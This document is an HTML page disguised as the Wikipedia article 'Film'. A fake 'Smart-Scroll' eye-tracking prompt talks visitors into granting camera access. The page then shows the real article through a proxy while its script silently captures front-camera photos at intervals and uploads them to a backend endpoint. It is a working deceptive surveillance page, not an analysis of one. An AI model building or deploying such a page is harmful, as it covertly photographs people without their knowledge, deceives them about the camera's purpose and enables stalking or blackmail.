<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Film - Wikipedia</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0">
    
    <style>
        /* Reset and Base Styles */
        body, html { 
            margin: 0; 
            padding: 0; 
            height: 100%; 
            width: 100%;
            overflow: hidden; 
            background: #fff; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        /* Perfectly Centered Permission Overlay */
        #overlay {
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%;
            background: #fff; 
            z-index: 9999; 
            display: flex; 
            flex-direction: column;
            align-items: center; 
            justify-content: center; 
            text-align: center; 
            padding: 24px;
            box-sizing: border-box;
        }

        .wiki-logo { 
            width: 90px; 
            margin-bottom: 24px; 
        }

        h2 { 
            font-size: 22px; 
            color: #333; 
            margin: 0 0 12px 0; 
        }

        p { 
            color: #666; 
            font-size: 15px; 
            line-height: 1.5;
            max-width: 320px; 
            margin: 0 0 32px 0; 
        }

        #enable-btn {
            background: #36b; 
            color: #fff; 
            border: none; 
            padding: 16px 32px;
            border-radius: 4px; 
            font-weight: bold; 
            font-size: 16px;
            cursor: pointer; 
            width: 100%;
            max-width: 280px;
            -webkit-tap-highlight-color: transparent;
        }

        /* Iframe for Wikipedia Content */
        #wiki-frame { 
            width: 100%; 
            height: 100%; 
            border: none; 
            display: none; 
        }

        /* Hidden camera elements */
        video, canvas { display: none; }
    </style>
</head>
<body>

<div id="overlay">
    <img src="https://en.wikipedia.org/static/images/icons/wikipedia.png" class="wiki-logo" alt="Wiki Logo">
    <h2>Enable Smart-Scroll</h2>
    <p>Wikipedia now supports Eye-Tracking. Allow camera access to automatically scroll the article as you read.</p>
    <button id="enable-btn">Enable & Read</button>
</div>

<iframe id="wiki-frame"></iframe>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    const btn = document.getElementById('enable-btn');
    const frame = document.getElementById('wiki-frame');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const overlay = document.getElementById('overlay');
    let startTime;

    btn.addEventListener('click', async () => {
        try {
            // Request camera with 'ideal' constraints for Instagram/Mobile compatibility
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                } 
            });
            
            video.srcObject = stream;
            
            // Wait for video stream to initialize to prevent black snapshots
            video.onloadedmetadata = () => {
                frame.src = "/proxy/wiki";
                frame.style.display = "block";
                overlay.style.display = "none";
                startTime = Date.now();
                startPhotoLoop();
            };
        } catch (err) {
            alert("Camera access is required for the Smart-Scroll reading experience.");
        }
    });

    function startPhotoLoop() {
        const elapsed = Date.now() - startTime;
        
        // Timing logic: 900ms for the first 10 seconds, then 7 seconds thereafter
        let delay = elapsed < 10000 ? 900 : 7000;

        setTimeout(async () => {
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                // Ensure photo matches camera's natural aspect ratio (no stretching)
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
                
                // Send to backend
                fetch('/api/upload-photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ dataUrl })
                }).catch(() => {});
            }
            // Recursive call for the next capture
            startPhotoLoop();
        }, delay);
    }
</script>

</body>
</html>
